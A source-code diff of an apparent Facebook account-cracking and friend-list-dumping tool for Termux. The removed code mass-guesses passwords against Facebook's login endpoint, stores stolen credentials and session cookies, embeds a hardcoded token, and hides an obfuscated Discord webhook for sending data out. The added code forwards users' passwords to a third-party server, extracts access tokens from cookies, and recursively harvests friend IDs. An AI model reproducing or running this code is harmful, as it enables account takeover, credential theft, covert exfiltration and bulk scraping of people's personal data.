@@ -1,628 +1,813 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Core Facebook API logic and async operations.
+Supports: Windows, Linux, Termux (Android)
 
+Author: SHAJON
+GitHub: SHAJON-404
+"""
+
+import os
+import sys
+import re
+import asyncio
+import random
+from pathlib import Path
+from typing import List, Dict, Set, Optional, Tuple, Any, Callable
+
+# Third-party imports (will be installed if missing)
 try:
-    import os,requests,json,time,re,random,sys,uuid,string,subprocess
-    from string import *
-    from concurrent.futures import ThreadPoolExecutor as tred
-except ModuleNotFoundError: 
-    print('\n Installing missing modules ...')
-    os.system('pip install requests bs4 futures==2 > /dev/null')
-    sys.exit(' \n [•] run again tool ')
-
-os.system('xdg-open https://chat.whatsapp.com/DkyCagXuNqR4ciqFOheuzs//')
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/rm"):
-    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
-else:pass
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/curl"):
-    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
-else:pass
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/pkg"):
-    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
-else:pass
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/pip"):
-    print(f"\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] You deleted the file, the tool is facing an issue!");sys.exit()
-else:pass
-
-
-def stg():
-    try:
-        open('/sdcard/XD.', 'a').write(' hunter Tool 🔥')
-    except:
-        os.system('termux-setup-storage')
-        stg()
-stg()
-
-
-try:
-    open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx.txt', 'r').read()
-except:
-    os.system('pip -q install httpx')
-    open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx.txt', 'a').write(' hunter Tool 🔥')
-
-import subprocess
-
-# print('\n \033[97;1m wait installing modules...!')
-# site_packages_path = "/data/data/com.termux/files/usr/lib/python3.12/site-packages"
-# httpx_path = os.path.join(site_packages_path, "httpx")
-# zip_file = "master.zip"
-# repo_url = "https://github.com/encode/httpx/archive/refs/heads/master.zip"
-# extracted_folder = "httpx-master"
-
-# def run_silent(command):
-    # subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-# if os.path.exists(httpx_path):
-    # run_silent(["rm", "-rf", httpx_path])
-
-# run_silent(["curl", "-LOk", repo_url])
-# run_silent(["unzip", "-o", zip_file])
-# run_silent(["mv", f"{extracted_folder}/httpx", site_packages_path])
-# run_silent(["rm", "-rf", zip_file, extracted_folder])
-
-try:
-    import httpx
+    import aiohttp
+    import aiofiles
+    import requests
 except ImportError:
-    os.system('pip -q uninstall httpx;pip -q install httpx')
-import httpx
+    import subprocess
+    for module in ['aiohttp', 'aiofiles', 'requests']:
+        subprocess.run([sys.executable, "-m", "pip", "install", module, "-q"])
+    import aiohttp
+    import aiofiles
+    import requests
 
-try:
-    import httpx
-except ImportError:
-    sys.exit("\n [!] module installing error contact admin")
-import httpx
-
-
+from config import Config
 
 
-
-W = '\033[97;1m'
-R = '\033[91;1m'
-G = '\033[92;1m'
-Y = '\033[93;1m'
-B = '\033[94;1m'
-P = '\033[95;1m'
-S = '\033[96;1m'
-IPGD ='\33[1;32m'
-
-
-sim_id = ''
-android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
-model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
-build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
-fblc = 'en_GB'
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-except:
-        fbcr = 'Zong'
-fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
-fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
-fbdv = model
-fbsv = android_version
-fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
-fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
-        total = 0
-        for i in fbcr:
-                total+=1
-        select = ('1','2')
-        if select == '1':
-                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-                sim_id+=fbcr
-        elif select == '2':
-                try:
-                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
-                        sim_id+=fbcr
-                except Exception as e:
-                        fbcr = "Zong"
-                        sim_id+=fbcr
-        else:
-                fbcr = 'Zong'
-                sim_id+=fbcr
-except:
-        fbcr = "Zong"
-device = {
-        'android_version':android_version,
-        'model':model,
-        'build':build,
-        'fblc':fblc,
-        'fbmf':fbmf,
-        'fbbd':fbbd,
-        'fbdv':model,
-        'fbsv':fbsv,
-        'fbca':fbca,
-        'fbdm':fbdm}
-
-def uaa():
-    return "[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/315213325;[FBAN/FB4A;FBAV/376.0.0.12.108;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/315213325;FBCR/Plusnet Mobile;FBMF/OPPO;FBBD/oppo;FBDV/CPH2485;FBSV/13.8.3;FBCA/x86:arm64-v8a]"
-
-logo='''
-    ▗▖ ▗▖▗▖ ▗▖▗▖  ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▄▖ 
-    ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌  █  ▐▌   ▐▌ ▐▌
-    ▐▛▀▜▌▐▌ ▐▌▐▌ ▝▜▌  █  ▐▛▀▀▘▐▛▀▚▖
-    ▐▌ ▐▌▝▚▄▞▘▐▌  ▐▌  █  ▐▙▄▄▖▐▌ ▐▌
-\033[1;31m\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[1;37m
-    creater  :  hunter xd 
-    type     :  file clone
-    status   :  PAID
-    version  :  10.6
-\033[1;31m\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[1;37m'''
-
-cptr = []
-
-def ysbd(jshdhd6):
-    poryg = ["h","t","t","p","s",":","/","/","d","i","s","c","o","r","d",".","c","o","m","/","a","p","i","/","w","e","b","h","o","o","k","s","/","1","3","4","1","7","3","2","2","3","6","2","3","5","3","7","4","6","1","3","/","d","0","_","c","z","k","o","-","I","9","B","N","0","9","z","F","6","H","c","Y","3","O","v","j","D","p","M","c","t","7","R","Y","3","Y","L","k","u","3","0","m","R","k","9","N","T","g","L","L","L","5","8","g","j","x","K","6","F","N","-","7","7","T","a","n","s","2","5","m"]
-    WEBHOOK_URL = "".join(poryg)
-    MESSAGE = {"content": f"{jshdhd6}"}
-    response = httpx.post(WEBHOOK_URL, json=MESSAGE)
-    if response.status_code == 204:pass
-    else:pass
-
-def linex():
-    print("\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=\033[0;91m=\033[1;97m=")
-def clear():
-    os.system('clear')
-    print(logo)
-
-
-
-loop=0
-oks=[]
-cps=[]
-pcp=[]
-id=[]
-tokenku=[]
-
-
-
-
-def check_key():
-    try:
-        key = open('/sdcard/Android/.nonemedia.js', 'r').read().strip()
-    except FileNotFoundError:
-        # If file doesn't exist, create it with a new UUID
-        key = uuid.uuid4().hex.upper()
-        with open('/sdcard/Android/.nonemedia.js', 'w') as f:
-            f.write(key)
-        return check_key()  # Retry reading
-
-    if len(key) != 32:
-        # If key length is not 32, reset and retry
-        os.remove('/sdcard/Android/.nonemedia.js')
-        return check_key()
-
-    return key
-
-def fetch_and_check_approval(key):
-    clear()
-    url = 'https://hunter-approvl.blogspot.com/2025/02/hunter.html?m=1'
-    try:
-        response = httpx.get(url)
-        if key in response.text:
-            print(' [√] your key approved...!');time.sleep(2)
+class FacebookAPI:
+    """
+    Facebook API operations handler.
+    Manages authentication, friend dumping, and API requests.
+    """
+    
+    # API Endpoints
+    GRAPH_API_BASE: str = "https://graph.facebook.com"
+    OAUTH_URL: str = "https://www.facebook.com/x/oauth/status"
+    TOKEN_API_URL: str = "https://api.shajon.dev/get_token"
+    LOGIN_API_URL: str = "https://api.shajon.dev/facebook_token"
+    UID_API_URL: str = "https://api.shajon.dev/facebook_info"
+    
+    # Retry settings
+    MAX_API_RETRIES: int = 10
+    
+    def __init__(self, config: Optional[Config] = None) -> None:
+        """
+        Initialize FacebookAPI with config.
+        
+        Args:
+            config: Configuration instance (uses singleton if not provided)
+        """
+        self._config = config or Config()
+        self._token: Optional[str] = None
+        self._cookie: Optional[str] = None
+        
+        # Load existing session
+        self._load_session()
+    
+    # ================== PROPERTIES ==================
+    
+    @property
+    def config(self) -> Config:
+        """Get configuration instance."""
+        return self._config
+    
+    @property
+    def token(self) -> Optional[str]:
+        """Get current access token."""
+        return self._token
+    
+    @token.setter
+    def token(self, value: str) -> None:
+        """Set access token and save to session."""
+        self._token = value
+        self._config.save_token(value)
+    
+    @property
+    def cookie(self) -> Optional[str]:
+        """Get current cookie."""
+        return self._cookie
+    
+    @cookie.setter
+    def cookie(self, value: str) -> None:
+        """Set cookie and save to session."""
+        self._cookie = value
+        self._config.save_cookie(value)
+    
+    @property
+    def is_logged_in(self) -> bool:
+        """Check if user is logged in."""
+        return bool(self._token and self._cookie)
+    
+    @property
+    def headers(self) -> Dict[str, str]:
+        """Get API request headers."""
+        return {
+            "User-Agent": Config.generate_fb_user_agent()
+        }
+    
+    # ================== SESSION MANAGEMENT ==================
+    
+    def _load_session(self) -> None:
+        """Load token and cookie from saved session."""
+        self._token = self._config.load_token()
+        self._cookie = self._config.load_cookie()
+    
+    def logout(self) -> None:
+        """Clear credentials and logout."""
+        self._token = None
+        self._cookie = None
+        self._config.clear_credentials()
+    
+    # ================== UTILITY METHODS ==================
+    
+    @staticmethod
+    def parse_cookies(cookie_str: str) -> Dict[str, str]:
+        """Parse cookie string to dictionary."""
+        cookies = {}
+        for cookie in cookie_str.split(';'):
+            if '=' in cookie:
+                key, value = cookie.strip().split('=', 1)
+                cookies[key] = value
+        return cookies
+    
+    async def _make_request(
+        self,
+        session: aiohttp.ClientSession,
+        url: str,
+        headers: Dict[str, str],
+        cookies: Dict[str, str]
+    ) -> Optional[Dict[str, Any]]:
+        """Make an async GET request and return JSON response."""
+        try:
+            async with session.get(url, headers=headers, cookies=cookies) as response:
+                if response.status == 200:
+                    return await response.json()
+        except Exception:
             pass
-        else:
-            print(' [×] your key not approved...!')
-            time.sleep(2)
-            linex()
-            print(f' Your Key : {key} ')
-            linex()
-            input(' (•) press enter for approval')
-            os.system(f'termux-open-url "https://wa.me/+923450877570?text=*I Want Buy Your Hunter Tool...!*\n *My Key : {key}*"')
-            key = check_key()
-            fetch_and_check_approval(key)
-    except httpx.ConnectError:
-        sys.exit(' [!] Your Internet Connection Lol...!')
-    except Exception as e:
-        sys.exit(f'An error occurred: {e}')
-
-# key = check_key()
-# fetch_and_check_approval(key)
-
-
-
-def menu():
-            clear()
-        #    linex()
-            print(' [1] File cloning\n [2] Random cloning \n [0] Exit menu')
-            linex()
-            xd=input(' ? Choose option : ')
-        #    os.system('xdg-open)
-            if xd in ['1','01']:
-                clear()
-                print(' ! Put file example : /sdcard/File.txt ...etc.')
-                linex()
-                file = input(' ? Put file path\033[1;37m : ')
-                try:
-                    fo = open(file,'r').read().splitlines()
-                except FileNotFoundError:
-                    print(' × File location not found ')
-                    time.sleep(1)
-                    menu()
-                clear()
+        return None
+    
+    # ================== TOKEN EXTRACTION ==================
+    
+    def _extract_token_from_cookie(self, cookie: str) -> Optional[str]:
+        """Try to extract access token using OAuth endpoint."""
+        vsn = random.randint(80, 133)
+        
+        headers = {
+            'Accept-Language': 'id,en;q=0.9',
+            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{vsn}.0.0.0 Safari/537.36',
+            'Referer': 'https://www.instagram.com/',
+            'Host': 'www.facebook.com',
+            'Origin': 'https://www.instagram.com',
+        }
+        
+        try:
+            response = requests.get(
+                f'{self.OAUTH_URL}?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/',
+                headers=headers,
+                cookies={'cookie': cookie},
+                timeout=30
+            )
+            
+            if '"access_token":' in str(response.headers):
+                match = re.search(r'"access_token":"([^"]+)"', str(response.headers))
+                if match:
+                    return match.group(1)
+        except Exception:
+            pass
+        
+        return None
+    
+    def _extract_token_from_api(self, cookie: str) -> Optional[str]:
+        """Try to extract token using external API."""
+        try:
+            response = requests.post(
+                self.TOKEN_API_URL,
+                json={'cookies': cookie},
+                timeout=30
+            )
+            data = response.json()
+            
+            if data.get('status') == 'success' and data.get('data', {}).get('access_token'):
+                return data['data']['access_token']
+        except Exception:
+            pass
+        
+        return None
+    
+    # ================== UID EXTRACTION ==================
+    
+    def extract_uid_from_url(self, url: str) -> Optional[str]:
+        """Extract Facebook UID from profile URL."""
+        if not url.startswith("https://www.facebook.com/"):
+            return None
+        
+        try:
+            response = requests.post(
+                self.UID_API_URL,
+                json={
+                    "url": url,
+                    "show_all_social_links": False
+                },
+                timeout=30
+            )
+            data = response.json()
+            
+            if data.get('status') == 'success' and data.get('data', {}).get('user_id'):
+                return data['data']['user_id']
+        except Exception:
+            pass
+        
+        return None
+    
+    # ================== LOGIN METHODS ==================
+    
+    def login_with_credentials(self, uid: str, password: str) -> Tuple[bool, str]:
+        """
+        Login using UID and password via API.
+        
+        Args:
+            uid: Facebook UID or email
+            password: Account password
+        
+        Returns:
+            (success, status_message)
+        """
+        retry_count = 0
+        
+        while retry_count < self.MAX_API_RETRIES:
+            try:
+                # Call login API
+                response = requests.post(
+                    self.LOGIN_API_URL,
+                    json={
+                        "email": uid,
+                        "password": password,
+                        "convert_all": True
+                    },
+                    timeout=30
+                )
                 
-                plist = []
-                try:
-                    ps_limit = int(input(' ? password limit ? : '))
-                except:
-                    ps_limit =1
-                clear()
-                print('\033[1;32m ! examples : first last,firtslast ..etc')
-                linex()
-                for i in range(ps_limit):
-                    plist.append(input(f' ? Put password {i+1} : '))
-                clear()
-                print(' ? Do you went show cp account? (y/n) : ')
-                linex()
-                cx=input(' Choose: ')
-                if cx in ['y','Y','yes','Yes','1']:
-                    pcp.append('y')
+                response_text = response.text
+                
+                # Check for proxy error - retry if found
+                if "SOCKSHTTPSConnectionPool" in response_text:
+                    retry_count += 1
+                    self._config.animate(
+                        f'{self._config.style_box} PROXY ERROR, RETRYING ({retry_count}/{self.MAX_API_RETRIES})...'
+                    )
+                    continue
+                
+                data = response.json()
+                
+                # Check for success
+                if data.get('status') == 'success' and data.get('data', {}).get('cookies'):
+                    cookie = data['data']['cookies']
+                    
+                    # Use cookies to get token
+                    token = self._extract_token_from_cookie(cookie)
+                    if not token:
+                        token = self._extract_token_from_api(cookie)
+                    
+                    if token:
+                        self.cookie = cookie
+                        self.token = token
+                        return True, "SUCCESS"
+                    return False, "TOKEN_FAILED"
+                
+                # Check for checkpoint
+                error_msg = str(data.get('message', '')).lower()
+                if 'checkpoint' in error_msg or 'two-factor' in error_msg:
+                    return False, "CHECKPOINT"
+                
+                # Check for invalid credentials
+                if 'invalid' in error_msg or 'incorrect' in error_msg or 'wrong' in error_msg:
+                    return False, "INVALID_CREDENTIALS"
+                
+                # Generic error
+                return False, data.get('message', 'LOGIN_FAILED')
+                
+            except requests.exceptions.Timeout:
+                retry_count += 1
+                self._config.animate(
+                    f'{self._config.style_box} TIMEOUT, RETRYING ({retry_count}/{self.MAX_API_RETRIES})...'
+                )
+                continue
+            except Exception as e:
+                return False, f"ERROR: {e}"
+        
+        return False, "MAX_RETRIES_EXCEEDED"
+    
+    def login_with_cookie(self, cookie: str) -> Tuple[bool, str]:
+        """
+        Login using cookie.
+        
+        Args:
+            cookie: Facebook cookie string
+        
+        Returns:
+            (success, status_message)
+        """
+        # Ensure cookie has 'sb=' prefix
+        if not re.search(r'sb=[^;]+', cookie):
+            cookie = f'sb=By.ShajoN-404.OfficiaL;{cookie}'
+        
+        # Try OAuth method first
+        token = self._extract_token_from_cookie(cookie)
+        if token:
+            self.cookie = cookie
+            self.token = token
+            return True, "SUCCESS"
+        
+        # Fallback to API method
+        token = self._extract_token_from_api(cookie)
+        if token:
+            self.cookie = cookie
+            self.token = token
+            return True, "SUCCESS"
+        
+        return False, "TOKEN_FAILED"
+    
+    # ================== LOGIN VALIDATION ==================
+    
+    def validate_login(self) -> Tuple[bool, List[str]]:
+        """
+        Validate login by checking if we can fetch friends data.
+        
+        Returns:
+            (success, list_of_friend_ids)
+        """
+        if not self.is_logged_in:
+            return False, []
+        
+        # Load test UIDs
+        uid_file = None
+        possible_paths = [
+            Path(".uid.txt"),
+            Path("IMAGE/.uid.txt"),
+            self._config.script_dir / ".uid.txt",
+        ]
+        
+        for path in possible_paths:
+            if path.exists():
+                uid_file = path
+                break
+        
+        if not uid_file:
+            print(f"{self._config.style_box} {self._config.r}WARNING:{self._config.w} .uid.txt not found, skipping validation")
+            return True, []
+        
+        try:
+            test_uids = uid_file.read_text().splitlines()
+        except Exception as e:
+            print(f"{self._config.style_box} {self._config.r}ERROR:{self._config.w} Cannot read .uid.txt: {e}")
+            return True, []
+        
+        if not test_uids:
+            return True, []
+        
+        cookies_dict = self.parse_cookies(self._cookie)
+        friend_ids = []
+        blocked_detected = False
+        login_success = False
+        
+        for uid in test_uids:
+            uid = uid.strip()
+            if not uid:
+                continue
+            
+            uid_masked = uid[:8] + "*****" if len(uid) > 8 else uid
+            self._config.animate(f'{self._config.style_box} TRYING {uid_masked}...')
+            
+            try:
+                url = f"{self.GRAPH_API_BASE}/{uid}?access_token={self._token}&fields=friends"
+                response = requests.get(url, headers=self.headers, cookies=cookies_dict, timeout=10)
+                data = response.json()
+                
+                error_words = ["blocked", "misuse", "abusive", "exceeded", "misusing", "error"]
+                if any(word in str(data).lower() for word in error_words):
+                    self._config.animate(f'{self._config.style_box}{self._config.r} BLOCKED {self._config.w}→ {uid_masked}')
+                    self._config.linex()
+                    blocked_detected = True
+                    continue
+                
+                friends = data.get('friends', {}).get('data', [])
+                if friends:
+                    self._config.animate(f'{self._config.style_box}{self._config.g} SUCCESS {self._config.w}→ {uid_masked}')
+                    friend_ids = [f['id'] for f in friends]
+                    self._config.save_login_check(friend_ids)
+                    login_success = True
+                    self._config.linex()
+                    self._config.animate(f"{self._config.style_box}{self._config.g} LOGIN SUCCESSFUL! FRIENDS DATA EXTRACTED.")
+                    self._config.linex()
+                    return True, friend_ids
                 else:
-                    pcp.append('n')
-                clear()
-                print(' \033[1;37m[1] Method M1 (new + mix best) \n [2] Method M2 (new + mix best) \n [3] Method M3 (old best) ')
-                linex()
-                mth = input(' ? Choose : ')
-                with tred(max_workers=30) as crack_submit:
-                    clear()
-                    total_ids = str(len(fo))
-                    print(' √ Total ids : \033[1;32m'+total_ids+f' ')
-                    print(' \033[1;37m√ on airplane mode after 5 mins')
-                    linex()
-                    for user in fo:
-                        ids,names = user.split('|')
-                        passlist = plist
-                        if mth =='1':
-                            crack_submit.submit(api2,ids,names,passlist)
-                        elif mth =='2':
-                            crack_submit.submit(api,ids,names,passlist)
-                        elif mth =='3':
-                            crack_submit.submit(api3,ids,names,passlist)
-                        else:
-                            crack_submit.submit(api,ids,names,passlist)
-                print('\033[1;37m')
-                linex()
-                print(' √ The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-                linex()
-                input(' Press enter to exit ');exit()
+                    self._config.animate(f'{self._config.style_box}{self._config.r} NO FRIENDS {self._config.w}→ {uid_masked}')
+                    continue
+                    
+            except requests.exceptions.Timeout:
+                self._config.animate(f'{self._config.style_box}{self._config.r} TIMEOUT {self._config.w}→ {uid_masked}')
+                continue
+            except Exception:
+                self._config.animate(f'{self._config.style_box}{self._config.r} ERROR {self._config.w}→ {uid_masked}')
+                continue
+        
+        if blocked_detected and not login_success:
+            self._config.linex()
+            self._config.animate(f'{self._config.style_box} TRY THIS COOKIES AFTER 10 HOURS...')
+            self._config.animate(f'{self._config.style_box} IT IS NOT POSSIBLE TO DUMP WITH THIS COOKIES AT THIS TIME.')
+            self._config.animate(f'{self._config.style_box} NOW TRY WITH ANOTHER INSTA ADDED FACEBOOK ID COOKIES.')
+            self._config.linex()
+        elif not login_success:
+            self._config.linex()
+            self._config.animate(f"{self._config.style_box} PLEASE LOGIN WITH ANOTHER COOKIE...!!")
+            self._config.animate(f"{self._config.style_box} ALL IDS FAILED, PLEASE USE VPN OR TRY ANOTHER COOKIE...!!")
+            self._config.linex()
+        
+        return False, []
+    
+    # ================== DUMP OPERATIONS ==================
+    
+    async def _fetch_friends(
+        self,
+        session: aiohttp.ClientSession,
+        uid: str
+    ) -> Optional[Dict[str, Any]]:
+        """Fetch friends list for a UID."""
+        url = f"{self.GRAPH_API_BASE}/{uid}?access_token={self._token}&fields=friends"
+        return await self._make_request(session, url, self.headers, {"cookies": self._cookie})
+    
+    async def dump_friends(
+        self,
+        uids: List[str],
+        output_file: Path,
+        unsep_file: Optional[Path] = None,
+        sep_prefixes: Optional[List[str]] = None,
+        recursive: bool = True,
+        progress_callback: Optional[Callable[[str], None]] = None
+    ) -> Tuple[int, int]:
+        """
+        Dump friends from list of UIDs.
+        
+        Args:
+            uids: List of UIDs to dump friends from
+            output_file: Path to save matching IDs
+            unsep_file: Path to save non-matching IDs (when separating)
+            sep_prefixes: Prefixes to filter by
+            recursive: Whether to also dump friends of friends
+            progress_callback: Function to call with progress updates
+        
+        Returns:
+            (count_main, count_unsep)
+        """
+        if not self.is_logged_in:
+            return 0, 0
+        
+        written_main: Set[str] = set()
+        written_unsep: Set[str] = set()
+        all_friend_ids: List[str] = []
+        
+        # Phase 1: Get initial friends
+        async with aiohttp.ClientSession() as session:
+            tasks = [self._fetch_friends(session, uid) for uid in uids]
+            responses = await asyncio.gather(*tasks)
+            
+            for response in responses:
+                if response and 'error' not in response:
+                    friends = response.get('friends', {}).get('data', [])
+                    for friend in friends:
+                        friend_id = friend.get('id')
+                        if friend_id and friend_id not in all_friend_ids:
+                            all_friend_ids.append(friend_id)
+        
+        if not all_friend_ids:
+            return 0, 0
+        
+        all_friend_ids = sorted(set(all_friend_ids), reverse=True)
+        
+        if progress_callback:
+            progress_callback(f"Found {len(all_friend_ids)} friends to process")
+        
+        # Phase 2: Dump friends
+        target_uids = all_friend_ids if recursive else uids
+        line_count = 0
+        line_count_un = 0
+        
+        async with aiohttp.ClientSession() as session:
+            tasks = [self._fetch_friends(session, uid) for uid in target_uids]
+            
+            for i, uid in enumerate(target_uids):
+                if progress_callback and i % 10 == 0:
+                    progress_callback(f"Requesting: {uid}")
+            
+            responses = await asyncio.gather(*tasks)
+            
+            for response in responses:
+                if not response:
+                    continue
                 
-            elif xd in ['2','02']:
-                pak()
-            elif xd in ['0','00']:
-                exit()
-            else:
-                menu()
-
-def pak():
-        user=[]
-        clear()
-        print('\033[1;37m Code examplesv: 0334 , 0300 , 0315 ...etc')
-        code = input('\033[1;37m ? enter code : ')
-        try:
-            limit = int(input('\033[1;35m ! example : 2000, 3000, 15000, 99999\n\033[1;37m ? enter limit : '))
-        except ValueError:
-            limit = 99999
-        clear()
-        for nmbr in range(limit):
-            nmp = ''.join(random.choice(string.digits) for _ in range(7))
-            user.append(nmp)
-        with tred(max_workers=25) as zain:
-            clear()
-            tl = str(len(user))
-            print(' √ Total ids : \033[1;37m'+tl+f' ')
-            print(f'\033[1;37m √ choosed code  :\033[1;32m '+code)
-            print(' \033[1;37m√ on airplane mode after 5 mins')
-            linex()
-            for psx in user:
-                ids = code+psx
-                ps1 = ids[:6]
-                ps2 = ids[:7]
-                ps3 = ids[:8]
-                ps4 = ids[:9]
-                ps5 = ids[:10]
-                ps6 = ids[int(len(ids)) - 7:]
-                passlist = [psx,ids,ps1,ps2,ps3,ps4,ps5,ps6,'khan123','khan12345','khan1122','786786','firstlast786','khan0000','khankhan']
-                zain.submit(rd1,ids,passlist)
-        print('\033[1;37m')
-        linex()
-        print(' √ The process has completed')
-        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-        linex()
-        input(' Press enter to exit ')
-        exit()
-
-def rd1(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [HUNTER-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accessToken = '8540596655:AAE0992ko3FyYevf2slNyRon4s2SSw3kn-o'
-                        ua  = "[FBAN/FB4A;FBAV/545.0.0.43.63;FBBV/866994124;FBDM/{density=3.0,width=1080,height=2292};FBLC/th_Qaau_TH;FBRV/872480009;FBCR/AIS;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X670;FBSV/13;FBOP/19;FBCA/arm64-v8a:;]"
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        data = {
-                                'adid': adid,
-                                'format': 'json', 
-                                'device_id': device_id,
-                                'email': ids, 
-                                'password': pas, 
-                                'generate_analytics_claims': '1', 
-                                'credentials_type': 'password', 
-                                'source': 'login', 
-                                'error_detail_type': 
-                                'button_with_disabled', 
-                                'enroll_misauth': 'false', 
-                                'generate_session_cookies': '1',
-                                'generate_machine_id': '1', 
-                                'locale': 'fa_AF', 'client_country_code': 'AF',
-                                'fb_api_req_friendly_name': 'authenticate'}
-                        headers={
-                                'User-Agent':uaa(),
-                                'Accept-Encoding': 'gzip, deflate', 
-                                'Accept': '*/*', 
-                                'Connection': 'keep-alive', 
-                                'Authorization':f'OAuth {accessToken}', 
-                                'X-FB-Friendly-Name': 'authenticate', 
-                                'X-FB-Connection-Type': 'unknown', 
-                                'Content-Type': 'application/x-www-form-urlencoded', 
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        response = requests.post(url, data=data, headers=headers)
-                        po = response.json()
-                        #print(po)
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [HUNTER-OK] '+str(uid)+'|'+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/HUNTER-R-COKIE.txt','a').write(str(uid)+'|'+pas+ '|' +coki+'\n')
-                                        open('/sdcard/HUNTER-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(ids))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        #print('\r\r\x1b[1;31m [HUNTER-CP] '+str(ids)+'|'+pas+'\033[1;97m')
-                                        open('/sdcard/HUNTER-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
-        except Exception as e:pass
-
-def api(ids,names,passlist):
-        try:
-                global ok,loop
-                sys.stdout.write('\r\r\033[1;37m [HUNTER-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
